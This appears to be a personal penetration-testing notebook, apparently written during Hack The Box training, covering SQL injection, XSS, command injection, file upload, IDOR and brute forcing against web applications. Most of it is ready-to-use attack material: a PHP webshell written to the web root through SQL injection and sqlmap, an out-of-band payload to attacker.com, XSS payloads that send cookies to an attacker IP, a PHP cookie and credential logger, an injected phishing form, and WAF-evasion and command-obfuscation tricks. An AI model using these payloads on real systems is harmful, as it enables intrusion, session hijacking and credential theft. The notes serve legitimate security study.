### What Mistakes do Web Devs make

| **No.** | **Mistake**                                        |
| ------- | -------------------------------------------------- |
| `1.`    | Permitting Invalid Data to Enter the Database      |
| `2.`    | Focusing on the System as a Whole                  |
| `3.`    | Establishing Personally Developed Security Methods |
| `4.`    | Treating Security to be Your Last Step             |
| `5.`    | Developing Plain Text Password Storage             |
| `6.`    | Creating Weak Passwords                            |
| `7.`    | Storing Unencrypted Data in the Database           |
| `8.`    | Depending Excessively on the Client Side           |
| `9.`    | Being Too Optimistic                               |
| `10.`   | Permitting Variables via the URL Path Name         |
| `11.`   | Trusting third-party code                          |
| `12.`   | Hard-coding backdoor accounts                      |
| `13.`   | Unverified SQL injections                          |
| `14.`   | Remote file inclusions                             |
| `15.`   | Insecure data handling                             |
| `16.`   | Failing to encrypt data properly                   |
| `17.`   | Not using a secure cryptographic system            |
| `18.`   | Ignoring layer 8                                   |
| `19.`   | Review user actions                                |
| `20.`   | Web Application Firewall misconfigurations         |
#### OWASP Top 10

| **No.** | **Vulnerability**                          |
| ------- | ------------------------------------------ |
| `1.`    | Broken Access Control                      |
| `2.`    | Cryptographic Failures                     |
| `3.`    | Injection                                  |
| `4.`    | Insecure Design                            |
| `5.`    | Security Misconfiguration                  |
| `6.`    | Vulnerable and Outdated Components         |
| `7.`    | Identification and Authentication Failures |
| `8.`    | Software and Data Integrity Failures       |
| `9.`    | Security Logging and Monitoring Failures   |
| `10.`   | Server-Side Request Forgery (SSRF)         |
## SQL Injection (SQLi)
*Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *

Connect to SQL
```bash
mysql -u <user> -p
<password>
```
```bash
mysql -u <user> -h <IP> -P <port> -p
```
According to [Operator Precedence](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html) (Order of Operations) AND statements evaluate first and OR evaluate last

SQL commands
```sql
SELECT UNION FROM WHERE
```
[Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Detection
try single and double quotes 
'' "", Comments --
Use a # to terminate a line
```sql
<name>' or 1=1#
<name>' union select null, null#
<name>' union select null,null,version()#
<name>' union select null,null,table_name from information_schema.tables#
```


**URL Encoding**

| Payload | URL Encoding |
| ------- | ------------ |
| '       | %27          |
| "       | %22          |
| #       | %23          |
| ;       | %3B          |
| )       | %29          |


Since UNION joins parameters, it can only return as many

**Boolean Based**
With `Boolean Based` SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns `true`.

**Time Based**
As for `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.

**Blind**
These are SQL injections that when executed, show no obvious clue to the user

**Cookies**
Try using SQLi in BurpSuite on these fields to see if the field is inject-able. Also note that you may not have to use a quote to escape a string, as integer cookies are integers and not strings. This will depend on the cookie type, so just be aware of the variable type.
![[../../Pasted image 20250515193009.png]]
![[../../Pasted image 20250515193029.png]]


**SQL-Map**
Save a HTTP Post request with the query as a .txt

```bash
sqlmap -r <HTTP post file>
```
**Substring**
Sometimes you can enumerate individual letters/digits with a query. Enumerating through you can detect version information, passwords, and other information.
```sql
' and substring(select version()), x, y) = 'a.b.c'#
```
**Comments**
In line comments `--` `#` 
Multi-line `/**/`
Auth bypass w. comments
```sql
admin'--
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';

admin')--
```
![[../../Pasted image 20250513110359.png]]

**Union**
1. Start by identifying the number of columns
2. Identify columns
Run through 1, -> 1, 2 and onward to identify number of columns
```sql
' UNION select 1,2,3,4-- -
```
```sql
ds'UNION SELECT 1, user(), 3, 4 -- - 
```
![[../../Pasted image 20250513125617.png]]

You can enumerate database info like this 
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials' AND username = "newuser"-- -
```
**Files**
Identify DB user, then identify if you have FILE privileges. In theory, only DBA's should have FILE privileges
Try things with
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
**PHP Webshells via SQLi**
```php
<?php system($_REQUEST[0]); ?>
```
In a SQLi it may look more like 
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
**SQLMAP**
*And yes, it can crack passwords*
This tool supports all types of SQLi
- `B`: Boolean-based blind
	- `AND 1=1`
- `E`: Error-based
	- `AND GTID_SUBSET(@@version,0)`
- `U`: Union query-based
	- `UNION ALL SELECT 1,@@version,3`
- `S`: Stacked queries
	- `; DROP TABLE users`
- `T`: Time-based blind
	- `AND 1=IF(2>1,SLEEP(5),0)`
- `Q`: Inline queries
	- `SELECT (SELECT @@version) from`
Also, Out-of-Band Injects look like this`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

![[../../Pasted image 20250515150317.png]]
Then just swap ~~~curl~~~ for sqlmap

To dump a table use the `-dump` flag
Use the `--parse-errors` to debug
Use `-t /tmp/traffic.txt` to write output to a file
Use `-v <n>` to specify verbosity level
Use --proxy to send traffic through a proxy like Burp
Use `--level <1-5>` to extend boundaries
Use `--risk <1-3>` to specify risk/loudness
Use `--schema` to identify the database schema
Use `--search` to look for specific data
Use `-T <string>` for a specific table
Use `--current-user` to identify current DBMS user
Use `--file-read "/etc/passwd"` to read the password file

Sometimes you need to specify specific characters for the inject. This can be done like this.
```
--prefix="%'))" 
#or
--suffix="-- -"
```
Little extra for unions
```
--union-cols=<n>
--union-char='<value>' #to specify dummy value instead of NULL
--union-from <table>
```
**Database Enumeration**
Use `--current-user` to identify current DBMS user
Use `--banner` to banner grab DBMS version
Use `--current-db` to identify the DB administrator
Use `--tables -D <DB name>` to identify tables
Use `-C` to specify specific columns to output
Use `--start=<n>` and `--end=<n+>` to specify start and stop rows
Conditional Logic `--where="name LIKE 'f%'"
Use `--passwords` to identify passwords

**Bypassing Defensive Measures**
To add a token add `--csrf-token` inside the data param or in the command like this 
```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
If the system blocks repeat requests, try adding a random string with `--randomize=<str>`
You can use evaluated parameters to bypass calculated params. This can be done like this 
```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
To bypass WAF settings you can also use a proxy like this
```
--proxy="socks4://<ip>/
```
If you need more anonymity you can make a proxy file and use this param to rotate through proxies until one is blocked. 
```
--proxy-file
```
If you want to use Tor, use `--tor` to proxy through there. To verify Tor is working try `--check-tor`

If you suspect a user-agent blacklist use `--random-agent` to switch randomly between different browser user agents.

Tamper Script
Use these to bypass some types of WAF's. They modify the data before it hits the target. These 2 are the most common
```
--tamper=between,randomcase
```
Last up we can use chunks. It splits SQL statements into different chunks to bypass WAF's. The option for this is `-chunked`

**Shells Again**
```
#Write a shell file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

#Transfer file to location on SQL webserver
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

#Connect to shell session
curl http://www.example.com/shell.php?cmd=ls+-la

```
More simply just run `--os-shell`. There may be a problem with the specific type of SQLi used. For best results use an error based SQLi with `--technique=E`


![[../../cheatsheet-sql-injection-fundamentals.pdf]]

![[../../Sqlmap_Essentials_Module_Cheat_Sheet.pdf]]

---
## Cross Site Scripting (XSS)
**Stored (Persistent)**
*This is when XSS code is ran and stored server-side*
Basic XSS identification payload
```
# Probably avoid this, as it is often detected and permitted
<script>alert(window.origin)</script>
```
Other better ones are 
```
<script>print()</script>
<plaintext>
<script>alert(window.origin)</script>
<img src=x onerror="windows.location.href="http://<otherwebpage>/">
<img src=x onerror="prompt(1)">
```
To verify code has been ran successfully:
1. See output in browser window (popup, new text )
2. Check inspect elements and see if the payload has been inserted into the webpage
For a specific value in a page like a `cookie`, use `document.cookie`

For more see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) and the [PayloadBox](https://github.com/payloadbox/xss-payload-list) 

**Reflected (Non-Persistent)**
*This is when XSS code is ran server-side and not stored*

**DOM**
*This is when XSS code is ran directly into the browser and not stored*
```
<img src="" onerror=alert(window.origin)>
<iframe src="javascript:alert(`xss`)">.
```

It's the same type of stuff, it just functions a little different.

**Discovery**
*Some scanners can detect the presence of XSS, like Burp, ZAP, and Nessus*
Some open source tools that an help are:
- XSS Strike
- Brute XSS
- XSSer
The basic XSS Strike syntax is 
```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

With our PHP webserver we can execute payloads on all fields and mark our payloads for their location. Then we will see if a field returns a call to our server. 
![[../../Pasted image 20250603093610.png]]
![[../../Pasted image 20250603093853.png]]
**Defacement**
Four main elements to change 
- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

**Phishing**
These can either be stored XSS or reflected/DOM. If it isn't stored, you may be able to use XSS in the URL and send a malicious link.  One basic example is injecting a form into a webpage URL, so that we can steal credentials.
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
As a XSS payload that would look like this 
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
To remove an element run
```
document.getElementById('<element>').remove();
```
To connect to the listener
```
sudo nc -lvnp 80
```
The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
Then run 
```shell-session
Enigma3nma@htb[/htb]$ mkdir /tmp/tmpserver
Enigma3nma@htb[/htb]$ cd /tmp/tmpserver
Enigma3nma@htb[/htb]$ vim index.php #at this step we wrote our index.php file
Enigma3nma@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
**Blind XSS**
*It can't see you either*
Look for these in:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

**Hijacking**
*Perform a cookie robbery. Commit identity fraud. Usual days work.*

To send a file:
```
<script src="http://OUR_IP/script.js"></script>
```
You can change `script.js` to a field/object we are injecting it into and call it like this ``
```
<script src="http://OUR_IP/<field>"></script>
```
Then if you get a request for `/username` you know it is injectable.
Here are a few payloads you can try (from PayloadsAllTheThings)
```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
Steal a cookie:
```
document.location='http://OUR_IP/index.php?c='+document.cookie;

new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
```
new Image().src='http://OUR_IP/index.php?c='+document.cookie

<script src=http://OUR_IP/script.js></script>
```



Our PHP code to steal the cookie
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

*Remember you must set up script.js, index.js, and the PHP server to get this to work*
![[../../Pasted image 20250807102431.png]]

![[../../Pasted image 20250807102352.png]]
`
![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]


---
## Command Injection
*Don't forget to go for reverse shells!!!!*
Here is a tool [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
Setup
```
Enigma3nma@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Enigma3nma@htb[/htb]$ cd Bashfuscator
Enigma3nma@htb[/htb]$ pip3 install setuptools==65
Enigma3nma@htb[/htb]$ python3 setup.py install --user
```
And another tool [DOSfucation](https://github.com/danielbohannon/Invoke-DOSfuscation)

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

Basic PHP command inject
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
![[../../Pasted image 20250717151422.png]]```
```NodeJS
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

![[../../Pasted image 20250717151422.png]]
Use `asd` to end a line
use `;` to add a second command inline

*It isn't uncommon for the `new-line` operator to not actually be blacklisted*
*If spaces `+` is blacklisted, also check tab `%09`*

You may also want to try $IFS, which is the Linux Environment Variable, as its default value is a space and a tab, so as long as it is accepted and hasn't been changed it should work 
![[../../Pasted image 20250801195709.png]]
The other option is to add a bash brace extension, which adds spaces. it looks like this `{ls,-la}`

#### How to add slashes back in
*It is also likely to have `/` and `\` blacklisted as those are used to reference file directories in Linux and Windows*
So how do we work around this?
**Calling Environmental Variables**
```linux
echo ${PATH:0:1}
/
echo ${LS_COLORS:10:1}
;
```
```windows
echo %HOMEPATH:~6,-11%
\
```
**Character Shifting**
This is when you call an ASCII table and shift the characters sequentially until you get the right one
```shell-session
Enigma3nma@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Enigma3nma@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```
![[../../Pasted image 20250801204232.png]]

**Bypassing Command Blacklisting**
Single and double quotes (just don't mix quote types)
```windows/linux
w'h'o'am'i
w"h"o"am"i
```
```linux only
who$@ami
w\ho\am\i
```
```windows only
who^ami
```
![[../../Pasted image 20250801205643.png]]

**Command Obfuscation**
Case Manipulation
```powershell-session
 WhOaMi
```
```ash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

```
```shell-session
Enigma3nma@htb[/htb]$ echo 'whoami' | rev
imaohw
21y4d@htb[/htb]$ $(rev<<<'imaohw')
21y4d
```
```Powershell
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
21y4d
```
Command Encoding
```
Enigma3nma@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
Enigma3nma@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

find /usr/share/ | grep root | grep mysql | tail -n 1 
*Isn't it beautiful?*
![[../../Pasted image 20250807165507.png]]

![[../../Command_Injections_Module_Cheat_Sheet.pdf]]
## Insecure File Upload
*Sometimes there are weak restrictions on file uploads*
*Don't forget to fuzz and check directories first*
Lets start easier with client side. *Always look here first*
Some systems authorize file uploads via client side. The file type is sent in the packet along with the file. If this is how it authz's, then it is possible to change the actual file-type of the file while leaving the part of the packet intact that does the authz. If changing just the header doesn't work there may be scanning after there may be server side authz.

```
<?php system($_GET['cmd']); ?>
```

You can all try using null bytes. This works with of PHP. Try change a file like this

```
image.php
```
to 
```
image.php%00.png
```
the null byte terminates the rest of the phrase, so it will instead end in the .php extension.

Now lets look at more server side techniques.

At the top of a file is metadata. You can see this metadata when you cat the file into the terminal. If the server authz's the file like this, then you will need to use a file matching the type you want. Send it, and capture the request in burp. Then clear out unneeded parts of the spoofed file-type and then insert the payload directly into it in burp.

Notice how we are keeping some data as well as the command structure
![[../../Pasted image 20250807160732.png]]

![[../../Pasted image 20250807160630.png]]

![[../../cheatsheet-file-inclusion.pdf]]


---

## AUTHN Attacks
You can use Burp or ffuf (ffuf may be faster)
```
ffuf -request req.txt -request-proto http -w <password_list>
```
![[../../Pasted image 20250728093443.png]]

Can other users AuthN with a MFA token?
Can this be brute forced?


---

## External Entities Injection (XXE)
This is another injection attack, where XML data is uploaded to a server and code is able to exit the file to run on system.

---
## Insecure Direct Object Reference (IDOR)
*Being able to manipulate a variable we really shouldn't even be able to see*
Here is a quick example, lets say you see this site
![[../../Pasted image 20250508150908.png]]
Lets look at that URL
![[../../Pasted image 20250508150933.png]]
It looks like the URL query PHP to show the account. The URL is *directly referencing* the account *object* in an *insecure* way. To exploit this I generated a list of numbers I thought would be in range.
![[../../Pasted image 20250508151416.png]]
Now I'll save this to a .txt file with
```
python3 -c "for i in range(1000,1201): print(i)" >> range.txt
```
Now lets use ffuf to fuzz out what numbers correspond with real accounts.
```
ffuf -c -u "http://127.0.0.1/labs/e0x02.php?account=FUZZ" -w range.txt
```
From here this shows us every single fuzzing attempt. Now find an index that was not a real account. While http file size will vary if you change based on the response, the not found probably won't change. So find a failed response size and add "-fs 849" to ffuf.
```
ffuf -u 'http://127.0.0.1/labs/e0x02.php?account=FUZZ' -w range.txt -fs 849

```
![[../../Pasted image 20250508152216.png]]
Now all the responses we get are for real users. 
To identify all the options i configured BurpSuite to show me all the admin and user accounts by using the grep-match option
![[../../Pasted image 20250508153934.png]]![[../../Pasted image 20250508153948.png]]
![[../../Pasted image 20250508154015.png]]
Using this we have found that the admins are
- 1008
- 1010
- 1012
- 1014
and the users are 1001-1019
### Capstone Notes

## Password Attacks
Brute Force
*I really hate this one*

```
ffuf -request <req.txt> -request-proto http -mode clusterbomb -w <password_wordlist>:FUZZPASS -w <user_wordlist>:FUZZUSER
```
![[../../Pasted image 20250731204743.png]]

Hash a string
```
echo -n <string> | md5sum
```